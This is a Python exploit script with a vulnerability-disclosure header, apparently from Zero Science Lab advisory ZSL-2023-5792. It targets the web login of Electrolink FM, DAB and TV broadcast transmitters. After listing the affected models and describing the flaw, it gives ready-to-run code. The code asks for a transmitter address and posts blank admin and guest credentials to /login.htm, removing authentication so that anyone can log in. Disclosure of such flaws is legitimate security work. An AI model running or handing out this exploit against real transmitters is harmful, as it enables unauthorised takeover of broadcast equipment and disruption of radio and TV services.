#!/usr/bin/env python
#
#
# Electrolink FM/DAB/TV Transmitter Remote Authentication Removal
#
#
# Vendor: Electrolink s.r.l.
# Product web page: https://www.electrolink.com
# Affected version: 10W, 100W, 250W, Compact DAB Transmitter
#                   500W, 1kW, 2kW Medium DAB Transmitter
#                   2.5kW, 3kW, 4kW, 5kW High Power DAB Transmitter
#                   100W, 500W, 1kW, 2kW Compact FM Transmitter
#                   3kW, 5kW, 10kW, 15kW, 20kW, 30kW Modular FM Transmitter
#                   15W - 40kW Digital FM Transmitter
#                   BI, BIII VHF TV Transmitter
#                   10W - 5kW UHF TV Transmitter
#                   Web version: 01.09, 01.08, 01.07
#                   Display version: 1.4, 1.2
#                   Control unit version: 01.06, 01.04, 01.03
#                   Firmware version: 2.1
#
# Summary: Since 1990 Electrolink has been dealing with design and
# manufacturing of advanced technologies for radio and television
# broadcasting. The most comprehensive products range includes: FM
# Transmitters, DAB Transmitters, TV Transmitters for analogue and
# digital multistandard operation, Bandpass Filters (FM, DAB, ATV,
# DTV), Channel combiners (FM, DAB, ATV, DTV), Motorized coaxial
# switches, Manual patch panels, RF power meters, Rigid line and
# accessories. A professional solution that meets broadcasters needs
# from small community television or radio to big government networks.
#
# Compact DAB Transmitters 10W, 100W and 250W models with 3.5"
# touch-screen display and in-built state of the art DAB modulator,
# EDI input and GPS receiver. All transmitters are equipped with a
# state-of-the art DAB modulator with excellent performances,
# self-protected and self-controlled amplifiers ensure trouble-free
# non-stop operation.
#
# 100W, 500W, 1kW and 2kW power range available on compact 2U and
# 3U 19" frame. Built-in stereo coder, touch screen display and
# efficient low noise air cooling system. Available models: 3kW,
# 5kW, 10kW, 15kW, 20kW and 30kW. High efficiency FM transmitters
# with fully broadband solid state amplifiers and an efficient
# low-noise air cooling system.
#
# FM digital modulator with excellent specifications, built-in
# stereo and RDS coder. Digital deviation limiter together with
# ASI and SDI inputs are available. These transmitters are ready
# for ISOFREQUENCY networks.
#
# Available for VHF BI and VHF BIII operation with robust desing
# and user-friendly local and remote control. Multi-standard UHF
# TV transmitters from 10W up to 5kW with efficient low noise air
# cooling system. Analogue PAL, NTSC and Digital DVB-T/T2, ATSC
# and ISDB-Tb available.
#
# Desc: The application is vulnerable to an unauthenticated
# parameter manipulation that allows an attacker to set the
# credentials to blank giving her access to the admin panel.
# Also vulnerable to account takeover and arbitrary password
# change.
#
# Tested on: Mbedthis-Appweb/12.5.0
#            Mbedthis-Appweb/12.0.0
#
#
# Vulnerability discovered by Neurogenesia
# Macedonian Information Security Research & Development Laboratory
# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
#
#
# Advisory ID: ZSL-2023-5792
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5792.php
#
#
# 30.06.2023
#
#


import datetime
import requests

dt = datetime.datetime.now()
dt = dt.strftime('%d.%m.%Y %H:%M:%S')
nul = ''

print('Starting transmitter exploit at', dt)

ip = input('Enter transmitter ip: ')
if 'http' not in ip:
    ip = 'http://' + ip

ep = '/login.htm'
url = ip + ep

signature = {'Accept-Encoding' : 'gzip, deflate',
             'Accept-Language' : 'ku-MK,en;q=0.1806',
                  'User-Agent' : 'Broadcastso/B.B',
                  'Connection' : 'keep-alive'
             }
# ----------------- Line breaker v0.17 -----------------
postd = {    'adminuser' : nul,
             'guestuser' : nul,
         'adminpassword' : nul,
         'guestpassword' : nul
         }

print('Removing security control...')
r = requests.post(url, data = postd, headers = signature)
if r.status_code == 200:
    print('Done. Go and "Login".')
else:
    print('Error')
exit(-4)